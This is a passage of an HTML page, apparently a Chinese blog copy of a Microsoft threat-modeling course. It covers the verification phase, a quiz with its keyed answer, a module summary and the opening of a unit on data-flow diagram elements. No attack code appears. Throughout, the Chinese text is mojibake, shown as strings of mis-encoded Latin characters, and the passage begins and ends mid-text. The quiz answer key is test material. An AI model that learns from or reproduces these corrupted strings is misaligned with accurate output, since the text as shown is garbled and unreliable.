æ¯ä¸ªå¨èƒéƒ½å¯¹åº”åˆ°ä¸€ä¸ªå¯é™ä½æˆ–æ¶ˆé™¤é£é™©çš„å®‰å…¨æ§åˆ¶ã€‚ æ ¹æ®ç»„ç»‡çš„å®‰å…¨é£é™©æƒ¯ä¾‹ï¼Œç¡®å®šè¿™äº›å¨èƒçš„ä¼˜å…ˆçº§å¹¶è¿›è¡Œè·Ÿè¸ªã€‚C. æ­¤ä»»åŠ¡å±äºæ­¥éª¤ 2 - ä¸­æ–­é˜¶æ®µã€‚</psw></p><h3 id="æ­¥éª¤4-éªŒè¯"><a href="#æ­¥éª¤4-éªŒè¯" class="headerlink" title="æ­¥éª¤4 - éªŒè¯"></a>æ­¥éª¤4 - éªŒè¯</h3><p>éªŒè¯é˜¶æ®µæ˜¯å¨èƒå»ºæ¨¡è¿‡ç¨‹çš„æœ€åä¸€æ­¥ï¼Œé€šå¸¸å‘ç”Ÿåœ¨éƒ¨ç½²ç³»ç»Ÿä¹‹å‰ã€‚ å®ƒæ¶‰åŠåˆ°ç¡®ä¿æ»¡è¶³è¦æ±‚ã€éªŒè¯å‡è®¾ä»¥åŠå‡†å¤‡å¥½å®‰å…¨æ§åˆ¶ã€‚</p><h4 id="ç›®æ ‡-3"><a href="#ç›®æ ‡-3" class="headerlink" title="ç›®æ ‡"></a>ç›®æ ‡</h4><ul><li>ç¡®è®¤ç³»ç»Ÿæ»¡è¶³æ‰€æœ‰æ–°æ—§å®‰å…¨è¦æ±‚</li><li>é…ç½®äº‘æä¾›å•†ã€æ“ä½œç³»ç»Ÿå’Œç»„ä»¶ä»¥æ»¡è¶³å®‰å…¨è¦æ±‚</li><li>ç¡®ä¿ä½¿ç”¨æ­£ç¡®çš„å®‰å…¨æ§åˆ¶è§£å†³æ‰€æœ‰é—®é¢˜</li><li>åœ¨éƒ¨ç½²å‰å¯¹ç³»ç»Ÿè¿›è¡Œæ‰‹åŠ¨å’Œè‡ªåŠ¨éªŒè¯</li></ul><div class="note warning"><p>å¦‚æœä¸å®Œæˆæ­¤é˜¶æ®µï¼Œå°±æ— æ³•éªŒè¯æ˜¯å¦å·²æˆåŠŸå®Œæˆå®‰å…¨å·¥ä½œã€‚</p></div><h4 id="éªŒè¯è¦æ±‚å’Œè®¾ç½®é»˜è®¤å€¼"><a href="#éªŒè¯è¦æ±‚å’Œè®¾ç½®é»˜è®¤å€¼" class="headerlink" title="éªŒè¯è¦æ±‚å’Œè®¾ç½®é»˜è®¤å€¼"></a>éªŒè¯è¦æ±‚å’Œè®¾ç½®é»˜è®¤å€¼</h4><p>é¦–å…ˆï¼ŒéªŒè¯æ˜¯å¦æ»¡è¶³ç¬¬ä¸€é˜¶æ®µåˆ›å»ºçš„æ‰€æœ‰è¦æ±‚ã€‚</p><p>ç¤ºä¾‹ï¼š</p><ul><li>ç½‘ç»œå®‰å…¨è®¡åˆ’</li><li>æœºå¯†ç®¡ç†è§£å†³æ–¹æ¡ˆå®æ–½</li><li>æ—¥å¿—è®°å½•å’Œç›‘è§†ç³»ç»Ÿ</li><li>æ ‡è¯†å’Œè®¿é—®æ§åˆ¶</li></ul><p>ç„¶åï¼Œç¡®ä¿äº‘æä¾›å•†ã€æ“ä½œç³»ç»Ÿå’Œç»„ä»¶çš„é»˜è®¤é…ç½®è®¾ç½®å·²æ›´æ”¹ï¼Œå¯æ»¡è¶³æ‰€æœ‰å®‰å…¨è¦æ±‚ã€‚</p><p>ç¤ºä¾‹ï¼š</p><ul><li>å¯ç”¨ Azure SQL æ•°æ®åº“é€æ˜æ•°æ®åŠ å¯†ä»¥ä¿æŠ¤ç£ç›˜ä¸Šçš„æ•°æ®</li><li>ä½¿ç”¨åŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶ (RBAC) å‘ç”¨æˆ·ã€ç»„å’Œåº”ç”¨ç¨‹åºåˆ†é…æƒé™</li><li>è·¨æ‰€æœ‰é…ç½®æ–‡ä»¶å¯ç”¨ Windows é˜²ç«å¢™</li></ul><p>åº”è§£å†³ bug ç®¡ç†è§£å†³æ–¹æ¡ˆä¸­è®°å½•çš„æ‰€æœ‰é—®é¢˜å¹¶éªŒè¯æ‰€æœ‰ä¿®è¡¥ç¨‹åºã€‚</p><h4 id="æ‰§è¡ŒéªŒè¯"><a href="#æ‰§è¡ŒéªŒè¯" class="headerlink" title="æ‰§è¡ŒéªŒè¯"></a>æ‰§è¡ŒéªŒè¯</h4><p>æœ€åä¸€éƒ¨åˆ†æ¶‰åŠè¿è¡Œæ‰‹åŠ¨å’Œè‡ªåŠ¨éªŒè¯ã€‚ åœ¨ Microsoftï¼Œéƒ¨ç½²ç³»ç»Ÿä¹‹å‰å¿…é¡»å¯¹å…¶è¿›è¡ŒéªŒè¯ï¼ŒéªŒè¯è¿‡ç¨‹å¯èƒ½åŒ…å«è‡ªåŠ¨æ‰«æç¨‹åºã€ä»£ç è¯„å®¡å’Œæ¸—é€æµ‹è¯•ã€‚ å¯ä»¥åœ¨æ¯æ¬¡éƒ¨ç½²ä¹‹å‰æˆ–éš”ä¸€å®šçš„æ—¶é—´ï¼ˆå¦‚æ¯ 6 - 12 ä¸ªæœˆï¼‰å¼ºåˆ¶æ‰§è¡Œè¯¥è¿‡ç¨‹ã€‚</p><p>å¦‚æœä»¥ä¸‹ä»»ä¸€é—®é¢˜çš„ç­”æ¡ˆä¸ºâ€œæ˜¯â€ï¼Œæœ€å¥½è®¾ç½®è¾ƒçŸ­çš„éªŒè¯å‘¨æœŸï¼š</p><ul><li>æˆ‘çš„ç³»ç»Ÿä¼šåœ¨éƒ¨ä½¿ç”¨å—ï¼Ÿ</li><li>å®ƒå¯ä»¥å¤„ç†æœºå¯†æ•°æ®å—ï¼Ÿ</li><li>æˆ‘å¿…é¡»éµå®ˆæŸäº›è§„å®šå—ï¼Ÿ</li><li>æˆ‘çš„ç»„ç»‡æ˜¯å¦è¦æ±‚å®æ–½å…¶ä»–å®‰å…¨ä¿æŠ¤è¿‡ç¨‹ï¼Œä»¥åº”å¯¹éšç§å½±å“ã€è¿è¥é£é™©æˆ–å¼€å‘è¦æ±‚ï¼Ÿ</li></ul><h4 id="çŸ¥è¯†æ£€æŸ¥-3"><a href="#çŸ¥è¯†æ£€æŸ¥-3" class="headerlink" title="çŸ¥è¯†æ£€æŸ¥"></a>çŸ¥è¯†æ£€æŸ¥</h4><ol><li>éªŒè¯é˜¶æ®µè¦è¿›è¡Œå“ªäº›å·¥ä½œï¼Ÿ</li></ol><div class='checkbox'><input type="radio" />            <p>A. å®æ–½ä¸€ç³»åˆ—é€‚ç”¨çš„å®‰å…¨æ§åˆ¶ï¼Œä»¥å‡è½»æˆ–æ¶ˆé™¤é£é™©ã€‚</p>            </div><div class='checkbox'><input type="radio" />            <p>B. åœ¨å°†ä»£ç æ¨é€åˆ°æš‚å­˜åˆ†æ”¯è¿›è¡Œéƒ¨ç½²ä¹‹å‰ï¼Œéœ€è¦å¯¹å…¶è¿›è¡Œæ‰‹åŠ¨æ£€æŸ¥ã€‚</p>            </div><div class='checkbox'><input type="radio" />            <p>C. é’ˆå¯¹å…ˆå‰äº§ç”Ÿçš„å¨èƒæ‰‹åŠ¨æˆ–è‡ªåŠ¨éªŒè¯ç³»ç»Ÿï¼Œä»¥éªŒè¯å®‰å…¨æ§åˆ¶æ˜¯å¦é™ä½æˆ–æ¶ˆé™¤äº†é£é™©ã€‚</p>            </div><p>å‚è€ƒç­”æ¡ˆï¼š<psw>== C ==</psw></p><p>è§£é‡Šï¼š<psw>A. æ­¤ä»»åŠ¡å±äºæ­¥éª¤ 3 - ä¿®å¤é˜¶æ®µã€‚B. æ­¤ç­”æ¡ˆæ›´é€‚ç”¨äºæ“ä½œæ–¹é¢ï¼Œè€Œä¸æ˜¯å¨èƒå»ºæ¨¡è¿‡ç¨‹ã€‚C. æ­¤é˜¶æ®µçš„ä¸»è¦å·¥ä½œæ˜¯éªŒè¯ä¿®å¤ã€å‡è®¾å’Œæ»¡è¶³è¦æ±‚ã€‚</psw></p><h3 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h3><h4 id="æ‘˜è¦"><a href="#æ‘˜è¦" class="headerlink" title="æ‘˜è¦"></a>æ‘˜è¦</h4><p>å¨èƒå»ºæ¨¡æ˜¯å¸®åŠ©ä¿æŠ¤ç³»ç»Ÿã€åº”ç”¨ç¨‹åºã€ç½‘ç»œå’ŒæœåŠ¡çš„æœ‰æ•ˆæ–¹æ³•ã€‚ å®ƒå¯ä»¥è¯†åˆ«æ½œåœ¨çš„å¨èƒå¹¶æ¨èé£é™©é™ä½ç­–ç•¥ï¼Œä»¥å¸®åŠ©ä½ åœ¨å¼€å‘ç”Ÿå‘½å‘¨æœŸçš„æ—©æœŸå®ç°å®‰å…¨ç›®æ ‡ã€‚</p><p>æœ¬æ¨¡å—æ¶µç›–äº†ä»¥ä¸‹å†…å®¹ï¼š</p><ul><li>äº†è§£æ˜ç¡®è¦æ±‚å’Œå‡è®¾ä»¥å¸®åŠ©åˆ›å»ºæ•°æ®æµå…³ç³»å›¾çš„é‡è¦æ€§</li><li>äº†è§£å¯å¸®åŠ©ä½ æŸ¥æ‰¾ç³»ç»Ÿä¸­å®‰å…¨é—®é¢˜çš„æ¡†æ¶</li><li>äº†è§£æœ‰åŠ©äºå‡è½»æˆ–æ¶ˆé™¤æ½œåœ¨å¨èƒçš„å®‰å…¨æ§åˆ¶ç±»åˆ«</li><li>é‡ç‚¹ä»‹ç»åœ¨éƒ¨ç½²ä¹‹å‰éªŒè¯å‡è®¾ã€è¦æ±‚å’Œä¿®å¤çš„é‡è¦æ€§</li></ul><h4 id="åç»­æ­¥éª¤"><a href="#åç»­æ­¥éª¤" class="headerlink" title="åç»­æ­¥éª¤"></a>åç»­æ­¥éª¤</h4><p>åœ¨æ­¤å­¦ä¹ è·¯å¾„çš„åç»­å‡ ä¸ªæ¨¡å—ä¸­ï¼Œæˆ‘ä»¬å°†äº†è§£åœ¨å››ä¸ªé˜¶æ®µå¼•å…¥çš„æ¯ä¸ªæ¦‚å¿µï¼Œå¹¶è¿›è¡Œè¯¦ç»†è®¨è®ºï¼š</p><table><thead><tr><th align="left">æ¨¡å—</th><th align="left">æ ‡é¢˜</th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td align="left">2</td><td align="left">ä½¿ç”¨æ•°æ®æµå…³ç³»å›¾å…ƒç´ åˆ›å»ºå¨èƒæ¨¡å‹</td><td align="left">äº†è§£æ•°æ®æµå…³ç³»å›¾ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼ŒåŒ…æ‹¬ä½•æ—¶ä½¿ç”¨å®ƒä»¬ä»¥åŠè¦åŒ…å«çš„ä¸Šä¸‹æ–‡ã€‚</td></tr><tr><td align="left">3</td><td align="left">æä¾›å…·æœ‰é€‚å½“æ·±åº¦å±‚çš„ä¸Šä¸‹æ–‡</td><td align="left">åœ¨åˆ›å»ºæ•°æ®æµå…³ç³»å›¾ä¹‹å‰ï¼Œäº†è§£æ¯ä¸ªä¸Šä¸‹æ–‡å±‚æ¬¡çš„å·®å¼‚å’Œé€‚ç”¨æƒ…å½¢ã€‚</td></tr><tr><td align="left">4</td><td align="left">å¤„ç†æ•°æ®æµå…³ç³»å›¾æ—¶å…³æ³¨é€‚å½“çš„å¨èƒæ¨¡å‹</td><td align="left">äº†è§£å…³æ³¨å¨èƒå»ºæ¨¡æ´»åŠ¨çš„ä¸åŒæ–¹æ³•ã€‚</td></tr><tr><td align="left">5</td><td align="left">ä½¿ç”¨æ¡†æ¶è¯†åˆ«å¨èƒå¹¶æ‰¾åˆ°å‡å°‘æˆ–æ¶ˆé™¤é£é™©çš„æ–¹æ³•</td><td align="left">æ·±å…¥ç ”ç©¶ STRIDEï¼Œå¹¶è¿›ä¸€æ­¥äº†è§£å­˜åœ¨çš„é£é™©ä»¥åŠå¦‚ä½•é’ˆå¯¹è¿™äº›é£é™©ä¿æŠ¤ç³»ç»Ÿã€‚</td></tr><tr><td align="left">6</td><td align="left">è®¾ç½®é—®é¢˜çš„ä¼˜å…ˆçº§å¹¶åº”ç”¨å®‰å…¨æ§åˆ¶æªæ–½</td><td align="left">äº†è§£å¦‚ä½•è®¾ç½®å¨èƒä¼˜å…ˆçº§ï¼Œå¹¶äº†è§£ç³»ç»Ÿå®‰å…¨æ§åˆ¶çš„ä¸åŒç±»å‹å’ŒåŠŸèƒ½ã€‚</td></tr><tr><td align="left">7</td><td align="left">ä½¿ç”¨æ¨èå·¥å…·åˆ›å»ºæ•°æ®æµå›¾</td><td align="left">äº†è§£å¯ç”¨äºå¨èƒå»ºæ¨¡çš„å·¥å…·ã€‚</td></tr></tbody></table><h4 id="äº†è§£è¯¦ç»†ä¿¡æ¯"><a href="#äº†è§£è¯¦ç»†ä¿¡æ¯" class="headerlink" title="äº†è§£è¯¦ç»†ä¿¡æ¯"></a>äº†è§£è¯¦ç»†ä¿¡æ¯</h4><div class="tag link"><a class="link-card" title="å®‰å…¨å¼€å‘ç”Ÿå‘½å‘¨æœŸ" href="https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling"><div class="left"><img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" class="lazyload" data-srcset="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="/></div><div class="right"><p class="text">å®‰å…¨å¼€å‘ç”Ÿå‘½å‘¨æœŸ</p><p class="url">https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling</p></div></a></div><h2 id="æ¨¡å—2-ä½¿ç”¨æ•°æ®æµå…³ç³»å›¾å…ƒç´ åˆ›å»ºå¨èƒæ¨¡å‹"><a href="#æ¨¡å—2-ä½¿ç”¨æ•°æ®æµå…³ç³»å›¾å…ƒç´ åˆ›å»ºå¨èƒæ¨¡å‹" class="headerlink" title="æ¨¡å—2 | ä½¿ç”¨æ•°æ®æµå…³ç³»å›¾å…ƒç´ åˆ›å»ºå¨èƒæ¨¡å‹"></a>æ¨¡å—2 | ä½¿ç”¨æ•°æ®æµå…³ç³»å›¾å…ƒç´ åˆ›å»ºå¨èƒæ¨¡å‹</h2><h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p>æ•°æ®æµå…³ç³»å›¾ç”±å‘ˆç°ä¸ºå½¢çŠ¶å’Œçº¿æ¡çš„å…ƒç´ æ„æˆã€‚ æ•°æ®æµå…³ç³»å›¾ä»¥å›¾å½¢æ–¹å¼è¡¨ç¤ºç³»ç»Ÿçš„å„ä¸ªä¸»è¦éƒ¨åˆ†ã€‚</p><p>ç¤ºä¾‹åŒ…æ‹¬ï¼š</p><ul><li>ç”¨äºå­˜å‚¨å®¢æˆ·æ•°æ®çš„ Azure DB</li><li>å¤„ç†ç”¨æˆ·è¯·æ±‚çš„ Web æœåŠ¡</li><li>ä¸ç³»ç»Ÿäº¤äº’çš„ç”¨æˆ·</li><li>è·¨ä¿¡ä»»åŒºåŸŸçº§åˆ«æ›´æ”¹çš„æ•°æ®æµ</li></ul><p>åœ¨å¨èƒå»ºæ¨¡ä¸­ä½¿ç”¨å…ƒç´ åŠå…¶äº¤äº’ï¼Œä»¥å¸®åŠ©ç¡®å®šå¨èƒå¹¶é™ä½ç³»ç»Ÿé£é™©ã€‚ æ­¤è¿‡ç¨‹å¯å¸®åŠ©å·¥ç¨‹å¸ˆæ›´æœ‰æ•ˆåœ°è¿›è¡Œåä½œï¼ŒåŒæ—¶ä¿æŠ¤å…¶ç³»ç»Ÿå…å—æœ€å¸¸è§çš„å¨èƒæ”»å‡»ã€‚</p><p><strong><u>æœ¬æ¨¡å—å°†ä»‹ç»æ•°æ®æµå…³ç³»å›¾çš„æ¯ä¸ªå…ƒç´ ã€‚ è¿™äº›å…ƒç´ å…·æœ‰ä¸åŒçš„å½¢çŠ¶å’ŒåŠŸèƒ½ï¼Œå¹¶ä¸”éœ€è¦ç‰¹å®šçš„ä¸Šä¸‹æ–‡ã€‚</u></strong></p><div class="note info"><p>åœ¨æ•´ä¸ªå­¦ä¹ è·¯å¾„ä¸­ï¼Œå…ƒç´ ä¹Ÿå¯ä»¥ç§°ä¸ºâ€œæ¨¡å…·â€ã€‚</p></div><h4 id="ä½•æ—¶ä½¿ç”¨å…ƒç´ "><a href="#ä½•æ—¶ä½¿ç”¨å…ƒç´ " class="headerlink" title="ä½•æ—¶ä½¿ç”¨å…ƒç´ "></a>ä½•æ—¶ä½¿ç”¨å…ƒç´ </h4><p>åœ¨åˆ›å»ºæ•°æ®æµå…³ç³»å›¾æ—¶ä½¿ç”¨è¿™äº›å…ƒç´ ã€‚ å…³ç³»å›¾å¯æ˜¾ç¤ºç³»ç»Ÿåˆ›å»ºã€æ“çºµã€å­˜å‚¨ä»¥åŠåˆ é™¤æ•°æ®çš„æ–¹å¼ã€‚ æˆ‘ä»¬ä»¥ç¬¬ä¸€ä¸ªæ¨¡å—ä¸­çš„ç¤ºä¾‹ä¸ºåŸºç¡€è¿›è¡Œæ„å»ºï¼š</p><ul><li><strong>Azure å¾®æœåŠ¡</strong> - æ·»åŠ å…ƒç´ ä»¥æŒ‡å®šç”¨æˆ·ã€èº«ä»½éªŒè¯è¿‡ç¨‹ã€æ•°æ®å­˜å‚¨ã€æ•°æ®è¯·æ±‚å’Œå“åº”å¤„ç†è¿‡ç¨‹ã€‚<ul><li>åˆ«å¿˜äº†æŒ‡å®šä¿¡ä»»åŒºåŸŸçº§åˆ«æ›´æ”¹ã€‚</li></ul></li><li><strong>å…¬å…± API</strong> - æ·»åŠ å…ƒç´ ä»¥æŒ‡å®šç”¨æˆ·ã€æ•°æ®å­˜å‚¨ã€æ—¥å¿—è®°å½•å’Œç›‘è§†æµç¨‹ä»¥åŠç³»ç»Ÿçš„å…¶ä»–éƒ¨åˆ†ã€‚</li><li><strong>ç°æœ‰åº”ç”¨ç¨‹åºä¸Šçš„æ–°åŠŸèƒ½</strong> - æ·»åŠ å…ƒç´ ä»¥è¡¨ç¤ºç³»ç»Ÿçš„ç°æœ‰éƒ¨åˆ†å’Œæ–°çš„éƒ¨åˆ†ã€‚</li></ul><h4 id="å­¦ä¹ ç›®æ ‡-1"><a href="#å­¦ä¹ ç›®æ ‡-1" class="headerlink" title="å­¦ä¹ ç›®æ ‡"></a>å­¦ä¹ ç›®æ ‡</h4><p>åœ¨æœ¬æ¨¡å—ä¸­ï¼Œä½ å°†èƒ½å¤Ÿï¼š</p><ul><li>åŒºåˆ†æ¯ä¸ªå…ƒç´ çš„å½¢çŠ¶å’ŒåŠŸèƒ½</li><li>åœ¨åˆ›å»ºæ•°æ®æµå…³ç³»å›¾æ—¶ï¼ŒåŒ…å«å…ƒç´ çš„æ­£ç¡®ä¸Šä¸‹æ–‡</li></ul><div class="note success"><p>æ— å¿…å¤‡çŸ¥è¯†å³å¯å­¦ä¹  ï¼ˆ</p></div><h3 id="æ•°æ®æµå…³ç³»å›¾å…ƒç´ "><a href="#æ•°æ®æµå…³ç³»å›¾å…ƒç´ " class="headerlink" title="æ•°æ®æµå…³ç³»å›¾å…ƒç´ "></a>æ•°æ®æµå…³ç³»å›¾å…ƒç´ </h3><p>æ•°æ®æµå…³ç³»å›¾ç”±å„ç§å½¢çŠ¶ç»„æˆï¼Œè¿™äº›å½¢çŠ¶ç”¨äºåˆ›å»ºç³»ç»Ÿçš„å›¾å½¢è¡¨ç¤ºå½¢å¼ã€‚ æ¯ä¸ªå½¢çŠ¶éƒ½è¡¨ç¤ºä¸€ä¸ªç‹¬ç‰¹çš„åŠŸèƒ½ã€‚ ç³»ç»Ÿå°†åˆ†ææ¯ä¸ªäº¤äº’ä»¥å¸®åŠ©è¯†åˆ«æ½œåœ¨çš„å¨èƒå’Œæ‰¾åˆ°é™ä½é£é™©çš„æ–¹æ³•ã€‚</p><p>é€šè¿‡æ­£ç¡®ä½¿ç”¨å½¢çŠ¶ï¼Œä½ èƒ½æ›´å¥½åœ°æ˜ç™½åŒäº‹å’Œå®‰å…¨å›¢é˜Ÿæä¾›çš„ä¿¡æ¯ã€‚ æ¯ä¸ªäººéƒ½èƒ½äº†è§£è¯¥ç³»ç»Ÿçš„å·¥ä½œæ–¹å¼ã€‚ è¿™è¿˜å¯ä»¥ä½¿ä»–ä»¬æ— éœ€æŸ¥é˜…æ— æ•°çš„è®¾è®¡æ–‡æ¡£å’Œå¼€å‘è®¡åˆ’å³å¯å¯åŠ¨ç³»ç»Ÿå¹¶ä½¿å…¶æ­£å¸¸è¿è¡Œã€‚</p><div class="note info"><p>å¦‚æœæ— æ³•åœ¨æ•°æ®æµå…³ç³»å›¾ä¸­æ­£ç¡®åœ°ä½“ç°ç³»ç»Ÿçš„æ‰€æœ‰éƒ¨åˆ†ï¼Œåˆ™æœ‰å¯èƒ½éƒ¨ç½²å…·æœ‰æ½œåœ¨æ¼æ´çš„ç³»ç»Ÿã€‚</p></div><table><thead><tr><th align="left">å…ƒç´ </th><th align="left">å½¢çŠ¶</th><th align="left">å®šä¹‰</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td align="left">è¿‡ç¨‹</td><td align="left"><img src="/img/thread-modeling/process50.png" class="lazyload" data-srcset="/img/thread-modeling/process50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process50"></td><td align="left">æ¥æ”¶ã€ä¿®æ”¹è¾“å…¥æˆ–å°†è¾“å…¥é‡å®šå‘åˆ°è¾“å‡ºçš„ä»»åŠ¡ï¼Œå¦‚ Web æœåŠ¡ã€‚</td><td>Web æœåŠ¡</td></tr><tr><td align="left">æ•°æ®å­˜å‚¨</td><td align="left"><img src="/img/thread-modeling/data-store50.png" class="lazyload" data-srcset="/img/thread-modeling/data-store50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="data-store50"></td><td align="left">æ°¸ä¹…å’Œä¸´æ—¶æ•°æ®å­˜å‚¨ï¼Œå¦‚ Web ç¼“å­˜å’Œ Azure æ‰˜ç®¡æ•°æ®åº“ã€‚</td><td>Web ç¼“å­˜å’Œ Azure DB</td></tr><tr><td align="left">å¤–éƒ¨å®ä½“</td><td align="left"><img src="/img/thread-modeling/external-entity50.png" class="lazyload" data-srcset="/img/thread-modeling/external-entity50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="external-entity50"></td><td align="left">ç›´æ¥æ§åˆ¶ä¹‹å¤–çš„ä»»åŠ¡ã€å®ä½“æˆ–æ•°æ®å­˜å‚¨ï¼Œå¦‚ç”¨æˆ·å’Œç¬¬ä¸‰æ–¹ APIã€‚</td><td>ç”¨æˆ·å’Œç¬¬ä¸‰æ–¹ API</td></tr><tr><td align="left">æ•°æ®æµ</td><td align="left"><img src="/img/thread-modeling/data-flow50.png" class="lazyload" data-srcset="/img/thread-modeling/data-flow50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="data-flow50"></td><td align="left">è¿›ç¨‹ã€æ•°æ®å­˜å‚¨å’Œå¤–éƒ¨å®ä½“ä¹‹é—´çš„æ•°æ®ç§»åŠ¨ï¼Œå¦‚è¿æ¥å­—ç¬¦ä¸²å’Œæœ‰æ•ˆè´Ÿè½½ã€‚</td><td>è¿æ¥å­—ç¬¦ä¸²å’Œæœ‰æ•ˆè´Ÿè½½</td></tr><tr><td align="left">ä¿¡ä»»è¾¹ç•Œ</td><td align="left"><img src="/img/thread-modeling/trust-boundary-box50.png" class="lazyload" data-srcset="/img/thread-modeling/trust-boundary-box50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="trust-boundary-box50"><img src="/img/thread-modeling/trust-boundary-line50-7523817.png" class="lazyload" data-srcset="/img/thread-modeling/trust-boundary-line50-7523817.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="trust-boundary-line50"></td><td align="left">ä¿¡ä»»åŒºåŸŸåœ¨æ•°æ®æµç»ç³»ç»Ÿæ—¶æ›´æ”¹ï¼Œå¦‚ç”¨æˆ·ä½¿ç”¨ Internet è®¿é—®å—ä¿æŠ¤çš„å…¬å¸ç½‘ç»œæ—¶ã€‚</td><td>ç”¨æˆ·é€šè¿‡ Internet è¿æ¥åˆ°å®‰å…¨çš„å…¬å¸ç½‘ç»œ</td></tr></tbody></table><p>æˆ‘ä»¬å°†åœ¨æ¥ä¸‹æ¥çš„å‡ ä¸ªå•å…ƒä¸­è®¨è®ºæ¯ä¸ªå…ƒç´ ã€‚</p><h3 id="è¿‡ç¨‹-ä»»åŠ¡å…ƒç´ "><a href="#è¿‡ç¨‹-ä»»åŠ¡å…ƒç´ " class="headerlink" title="è¿‡ç¨‹ - ä»»åŠ¡å…ƒç´ "></a>è¿‡ç¨‹ - ä»»åŠ¡å…ƒç´ </h3><p><img src="/img/thread-modeling/process50.png" class="lazyload" data-srcset="/img/thread-modeling/process50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process50"></p><p>æ­¤å…ƒç´ ç”¨ä¸€ä¸ªåœ†åœˆè¡¨ç¤ºï¼Œè¡¨ç¤º<u><strong>å¯ä»¥ä¿®æ”¹æ¥æ”¶çš„è¾“å…¥æˆ–å°†æ¥æ”¶çš„è¾“å…¥é‡å®šå‘åˆ°å…¶ç›¸åº”è¾“å‡ºçš„æ´»åŠ¨</strong></u>ã€‚</p><p>ç¤ºä¾‹åŒ…æ‹¬ï¼š</p><ul><li>æ¥æ”¶ API è°ƒç”¨è¯·æ±‚å¹¶å°†å…¶è½¬å‘åˆ° API å¤„ç†æœåŠ¡çš„å¾®æœåŠ¡</li><li>åœ¨æ•°æ®å†™å…¥æ•°æ®å­˜å‚¨ä¹‹å‰éªŒè¯æ•°æ®è¾“å…¥çš„ä»£ç </li></ul><h4 id="ä½•æ—¶ä½¿ç”¨è¿‡ç¨‹å…ƒç´ "><a href="#ä½•æ—¶ä½¿ç”¨è¿‡ç¨‹å…ƒç´ " class="headerlink" title="ä½•æ—¶ä½¿ç”¨è¿‡ç¨‹å…ƒç´ "></a>ä½•æ—¶ä½¿ç”¨è¿‡ç¨‹å…ƒç´ </h4><p>åœ¨ä»¥ä¸‹é¡¹ä¹‹é—´æ·»åŠ è¿‡ç¨‹å…ƒç´ ï¼š</p><ul><li><strong>æ•°æ®å­˜å‚¨</strong> - å¤„ç†æ•°æ®å­˜å‚¨ä¹‹é—´çš„æ‰€æœ‰é€šä¿¡çš„è¿‡ç¨‹</li><li><strong>å…·æœ‰å…¶ä»–å…ƒç´ çš„å¤–éƒ¨å®ä½“</strong> - å¤„ç†æ‰€æœ‰ä»»åŠ¡å’Œé€šä¿¡çš„è¿‡ç¨‹</li><li><strong>è¿‡ç¨‹</strong> - å¤„ç†æ‰€æœ‰ä»»åŠ¡çš„è¿‡ç¨‹</li></ul><p>æ 